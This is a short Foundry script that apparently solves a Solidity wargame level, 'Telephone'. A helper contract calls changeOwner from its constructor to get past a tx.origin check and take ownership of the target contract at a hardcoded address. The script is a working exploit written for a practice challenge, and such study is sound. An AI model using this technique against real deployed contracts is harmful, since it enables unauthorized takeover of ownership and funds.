// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Tel.sol";

contract ali {
constructor(address newOwnwe , Telephone tele)
{tele.changeOwner(newOwnwe);}
}

contract Level4Solution is Script
{

Telephone public tel = Telephone(0x59d2dD171561b9a0C926C25400F9fE93047b8476);

function run() external
    {
       
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ali (vm.envAddress("MY_ADDRESS"),tel);
        
        console.log("my:" ,vm.envAddress("MY_ADDRESS"));
        console.log("new:" ,tel.owner());
        
        vm.stopBroadcast();
    }

}
